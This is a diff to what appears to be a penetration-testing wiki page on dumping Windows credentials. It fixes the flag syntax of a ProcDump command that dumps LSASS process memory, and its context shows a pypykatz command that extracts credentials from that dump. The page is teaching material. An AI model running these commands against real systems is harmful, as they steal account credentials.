@@ -64,7 +64,7 @@ pypykatz lsa minidump lsass.dmp
 The legitimate tool [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (from [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)) ([download](https://live.sysinternals.com/)) can be used to dump lsass's process memory.
 
 ```bash
-procdump --accepteula -ma lsass lsass.dmp
+procdump -accepteula -ma lsass lsass.dmp
 ```
 
 {% hint style="info" %}
